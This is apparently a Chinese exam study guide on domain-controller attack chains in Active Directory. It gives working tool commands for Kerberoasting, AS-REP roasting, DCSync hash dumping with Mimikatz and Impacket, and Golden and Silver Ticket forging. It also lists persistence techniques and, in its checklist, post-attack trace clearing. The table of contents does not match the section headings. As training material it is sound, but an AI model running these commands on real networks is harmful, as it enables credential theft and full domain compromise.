# 内网渗透之域控攻击全链路

> **📘 文档定位**：CISP 考试 渗透测试 高级 | 难度：⭐⭐⭐⭐⭐ | 预计阅读：30 分钟>
>
> 深入讲解域控制器攻击全链路：DCSync/DCShadow/NTDS.dit 提取/Skeleton Key/AdminSDHolder/Golden Ticket 等核心域控攻击技术。

---

## 导航目录

- [一、域环境基础](#一域环境基础)
- [二、域内信息收集](#二域内信息收集)
- [三、凭据攻击技术](#三凭据攻击技术)
- [四、域控持久化](#四域控持久化)
- [五、域控攻击全链路](#五域控攻击全链路)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 一、攻击链总览

```
域控攻击完整路径：

  初始立足点 → 域信息收集 → 权限提升 → 横向移动 → 域控拿下 → 持久化
     ↓            ↓            ↓         ↓         ↓         ↓
  WebShell    BloodHound   Kerberoast  PsExec    DCSync   Golden Ticket
  钓鱼攻击     PowerView    AS-REP      WMI       NTDS      AdminSDHolder
  弱口令       ADExplorer   委派滥用     WinRM     dump     Skeleton Key
```

---

## 二、域信息收集

### 2.1 BloodHound 分析

```powershell
# SharpHound 收集器
SharpHound.exe -c All --zipfilename domain_info.zip

# 导入 BloodHound → 可视化分析
# 关键查询：
# Find Shortest Paths to Domain Admins  — 到DA的最短路径
# Find Principals with DCSync Rights    — 谁有DCSync权限
# Find Kerberoastable Users             — 可Kerberoast的用户
# Find AS-REP Roastable Users           — 不使用Kerberos预认证的用户

# PowerView 常用命令
Get-NetDomain                          # 域信息
Get-NetUser -SPN                       # 有SPN的用户(可Kerberoast)
Get-NetComputer -Ping                  # 存活主机
Get-NetGroup "Domain Admins"           # DA组成员
Get-NetSession -Computer DC01          # 谁登录了DC
Find-LocalAdminAccess                  # 当前用户本地管理员权限的主机
```

---

## 三、凭据攻击

### 3.1 Kerberoasting

```bash
# 请求有SPN的用户的TGS票据 → 离线破解

# Windows:
Rubeus.exe kerberoast /outfile:hashes.txt

# Linux (Impacket):
GetUserSPNs.py domain.local/user:password -request -outputfile hashes.txt

# 离线破解：
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
# → 获得服务账户明文密码
# → 服务账户 = 往往有较高权限(甚至DA)
```

### 3.2 AS-REP Roasting

```bash
# 目标：未启用Kerberos预认证的用户

GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

hashcat -m 18200 asrep.txt rockyou.txt
```

### 3.3 DCSync

```
DCSync = 模拟域控请求，从DC同步密码哈希

需要权限：
  ✓ Domain Admins
  ✓ Enterprise Admins
  ✓ 被授予Replicating Directory Changes权限

工具：
  Mimikatz:
    lsadump::dcsync /domain:domain.local /user:krbtgt
    → 拿到KRBTGT的Hash → 可制作Golden Ticket

  Impacket:
    secretsdump.py domain.local/da_user:password@DC01
    → dump所有的NTDS.dit
```

---

## 四、票据攻击

### 4.1 Golden Ticket (黄金票据)

```
前提：已获得 krbtgt 的NTLM Hash (通过DCSync)

效果：伪造任意用户的TGT → 可访问域内任意资源 → 完全域控

生成：
  Mimikatz:
    kerberos::golden /domain:domain.local 
      /sid:S-1-5-21-xxxx 
      /krbtgt:<KRBTGT_NTLM_HASH> 
      /user:Administrator 
      /id:500 
      /ticket:golden.kirbi
  
  注入票据：
    kerberos::ptt golden.kirbi
    或
    Rubeus.exe ptt /ticket:golden.kirbi

检测：
  Event ID 4769: TGS请求中Ticket Encryption Type=0x17(RC4)
  → Golden Ticket 通常使用RC4加密，而正常应使用AES
```

### 4.2 Silver Ticket (白银票据)

```
前提：已获得目标服务的服务账户NTLM Hash

效果：伪造特定服务的TGS → 访问特定服务

例：伪造CIFS(文件共享)服务的Silver Ticket
  Mimikatz:
    kerberos::golden /domain:domain.local
      /sid:S-1-5-21-xxxx
      /target:fileserver.domain.local /service:cifs
      /rc4:<service_account_hash>
      /user:Administrator /id:500
      /ticket:silver.kirbi
```

---

## 五、ACL 滥用攻击

### 5.1 AdminSDHolder

```
AdminSDHolder = AD中的安全管理模板
每隔60分钟(SDProp) → 将AdminSDHolder的ACL应用到所有受保护组

受保护组：
  Domain Admins, Enterprise Admins, Schema Admins
  Administrators, Account Operators, Backup Operators
  Print Operators, Server Operators, Domain Controllers

攻击：获得AdminSDHolder的Write权限 → 
  修改其ACL → 60分钟后应用到DA组 → 
  攻击者获得DA组完全控制权 → 可持续提权到DA
```

---

## 六、持久化

| 技术 | 方法 |
|------|------|
| Golden Ticket | 无限期伪造TGT，即使改密码也有效 |
| Skeleton Key | 注入LSASS进程，万能密码登录 |
| AdminSDHolder | ACL持久化传承 |
| DSRM密码 | 修改目录服务恢复模式密码 |
| WMI事件订阅 | 创建恶意WMI永久事件 |
| DCShadow | 自注册为"伪DC"注入修改 |

---

## 七、Checklist

- [ ] BloodHound 域分析完成
- [ ] Kerberoasting/AS-REP Roasting执行
- [ ] 域内凭据提取（Mimikatz/Sekurlsa）
- [ ] DCSync权限检查与利用
- [ ] Golden/Silver Ticket制作与检测
- [ ] ACL滥用路径分析
- [ ] 持久化技术审查
- [ ] 攻击后清理方案（痕迹清除）
